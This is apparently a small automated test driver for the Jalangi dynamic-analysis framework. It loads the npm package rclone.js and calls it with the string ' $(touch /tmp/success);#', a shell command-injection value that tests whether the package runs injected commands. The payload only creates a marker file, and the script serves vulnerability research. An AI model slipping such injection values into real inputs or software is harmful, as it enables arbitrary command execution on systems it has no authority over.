// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/rclone.js/node_modules/rclone.js');
try {
	var x0 = [" $(touch /tmp/success);#"];
new PUT(x0)();
} catch (e) {
	console.log(e);
}